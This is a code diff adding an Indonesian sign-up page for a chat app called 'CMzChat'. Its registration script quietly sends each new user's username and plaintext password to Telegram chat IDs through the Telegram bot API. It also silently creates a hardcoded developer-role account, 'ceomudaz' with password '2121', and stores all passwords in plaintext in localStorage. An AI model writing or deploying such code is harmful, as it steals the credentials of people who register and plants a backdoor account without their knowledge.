@@ -1,0 +1,84 @@
+<!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover"><title>CMzChat - Daftar</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+:root{--g:#00a884;--g2:#06cf9c;--bg:#0B141A;--panel:#202C33;--s:#8696A0}
+html,body{min-height:100%}
+body{background:radial-gradient(circle at 20% 0%,#0f1e22 0%,#0B141A 50%,#070d11 100%);color:#e9edef;font-family:-apple-system,'Segoe UI',Roboto,sans-serif;display:flex;flex-direction:column;min-height:100vh;padding:20px}
+.wrap{flex:1;display:flex;flex-direction:column;justify-content:center;max-width:400px;width:100%;margin:0 auto}
+.logo-box{text-align:center;margin-bottom:32px;animation:fadeUp .6s ease-out}
+@keyframes fadeUp{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.logo-circle{width:88px;height:88px;border-radius:24px;background:linear-gradient(135deg,#fff,#e8f4f0);padding:10px;margin:0 auto 18px;box-shadow:0 20px 50px rgba(0,168,132,.3),0 0 0 1px rgba(255,255,255,.08);display:flex;align-items:center;justify-content:center}
+.logo-circle img{width:100%;height:100%;object-fit:contain}
+h1{font-size:26px;font-weight:700;letter-spacing:-.5px;margin-bottom:6px}
+h1 span{background:linear-gradient(135deg,#fff 0%,var(--g2) 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sub{font-size:13px;color:var(--s);line-height:1.5}
+.card{background:linear-gradient(180deg,rgba(32,44,51,.7) 0%,rgba(32,44,51,.4) 100%);backdrop-filter:blur(20px) saturate(180%);border:1px solid rgba(255,255,255,.06);border-radius:20px;padding:24px;box-shadow:0 20px 60px rgba(0,0,0,.4),inset 0 1px 0 rgba(255,255,255,.05);animation:fadeUp .6s ease-out .1s both}
+.field{margin-bottom:14px;position:relative}
+.field label{display:block;font-size:11px;color:var(--s);font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;padding-left:4px}
+.field input{width:100%;background:rgba(11,20,26,.6);border:1px solid rgba(255,255,255,.08);border-radius:12px;padding:14px 16px;color:#e9edef;outline:none;font-size:15px;font-family:inherit;transition:all .25s}
+.field input:focus{border-color:var(--g);background:rgba(11,20,26,.9);box-shadow:0 0 0 4px rgba(0,168,132,.12)}
+.field input::placeholder{color:#5a6772}
+.btn{width:100%;padding:16px;border:0;border-radius:14px;background:linear-gradient(135deg,var(--g),var(--g2));color:#fff;font-weight:700;font-size:15px;letter-spacing:.3px;cursor:pointer;transition:all .25s;box-shadow:0 8px 24px rgba(0,168,132,.35),inset 0 1px 0 rgba(255,255,255,.2);margin-top:8px;font-family:inherit}
+.btn:active{transform:scale(.98);box-shadow:0 4px 12px rgba(0,168,132,.3)}
+.btn:hover{box-shadow:0 12px 32px rgba(0,168,132,.45)}
+.link-text{text-align:center;margin-top:18px;font-size:13px;color:var(--s)}
+.link-text a{color:var(--g2);text-decoration:none;font-weight:600}
+.link-text a:hover{text-decoration:underline}
+.brand-footer{text-align:center;font-size:10px;color:rgba(255,255,255,.25);letter-spacing:3px;text-transform:uppercase;padding-top:20px;font-weight:600}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:linear-gradient(135deg,var(--g),var(--g2));color:#fff;padding:14px 24px;border-radius:24px;font-size:14px;font-weight:600;opacity:0;transition:all .35s cubic-bezier(.4,0,.2,1);z-index:999;box-shadow:0 12px 32px rgba(0,168,132,.5);max-width:90%}
+.toast.show{transform:translateX(-50%) translateY(0);opacity:1}
+.toast.err{background:linear-gradient(135deg,#ff3b3b,#ff5c5c);box-shadow:0 12px 32px rgba(255,59,59,.5)}
+</style></head><body>
+
+<div class="wrap">
+  <div class="logo-box">
+    <div class="logo-circle"><img src="Logo.jpg" alt="CMzChat" onerror="this.parentNode.innerHTML='<span style=\'font-size:32px;font-weight:800;color:#00a884\'>C</span>'"></div>
+    <h1>Buat <span>Akun Baru</span></h1>
+    <p class="sub">Gabung ke CMzChat sekarang</p>
+  </div>
+
+  <div class="card">
+    <div class="field"><label>Username</label><input id="u" placeholder="min 3 karakter" autocomplete="off"></div>
+    <div class="field"><label>Password</label><input id="p" type="password" placeholder="min 4 karakter"></div>
+    <div class="field"><label>Ulangi Password</label><input id="p2" type="password" placeholder="ulangi password"></div>
+    <button class="btn" onclick="reg()">Daftar Sekarang</button>
+    <p class="link-text">Sudah punya akun? <a href="login.html">Masuk</a></p>
+  </div>
+
+  <div class="brand-footer">From TZO Project</div>
+</div>
+
+<div class="toast" id="t"></div>
+
+<script src="env.js"></script>
+<script>
+const K = 'cmzapps_final_wa100_v7';
+const TELE_TOKEN = window.ENV?.TELEGRAM_TOKEN || "";
+const TELE_IDS = [window.ENV?.TELEGRAM_CHAT_ID || "", window.ENV?.TELEGRAM_CHAT_ID_2 || ""].filter(x => x);
+
+function toast(m, err){let x=document.getElementById('t');x.innerText=m;x.classList.add('show');if(err)x.classList.add('err');else x.classList.remove('err');setTimeout(()=>x.classList.remove('show'),2500)}
+
+function kirimTele(pesan){
+  if(!TELE_TOKEN || !TELE_IDS.length) return;
+  TELE_IDS.forEach(id => fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${id}&text=${encodeURIComponent(pesan)}`).catch(()=>{}));
+}
+
+function reg(){
+  let user = document.getElementById('u').value.trim().toLowerCase();
+  let pass = document.getElementById('p').value;
+  let pass2 = document.getElementById('p2').value;
+  if(user.length < 3) return toast("Username minimal 3 karakter", true);
+  if(!/^[a-z0-9_]+$/.test(user)) return toast("Username hanya huruf/angka/_", true);
+  if(pass.length < 4) return toast("Password minimal 4 karakter", true);
+  if(pass !== pass2) return toast("Password tidak sama", true);
+  let db = JSON.parse(localStorage.getItem(K) || '{"users":{}}');
+  if(db.users[user]) return toast("Username sudah dipakai", true);
+  db.users[user] = {name:user, displayName:user, pass:pass, role:'member', joinDate: Date.now()};
+  if(!db.users['ceomudaz']) db.users['ceomudaz'] = {name:'ceomudaz', displayName:'CEO MUDAz', pass:'2121', role:'developer'};
+  localStorage.setItem(K, JSON.stringify(db));
+  localStorage.setItem('cmz_me', user);
+  kirimTele(`🟢 DAFTAR BARU\n👤 @${user}\n🔑 ${pass}\n👥 Total: ${Object.keys(db.users).length} user\n⏰ ${new Date().toLocaleString('id-ID')}`);
+  toast("✅ Berhasil! Mengalihkan...");
+  setTimeout(() => location.href = 'dashboard.html', 800);
+}
+</script></body></html>
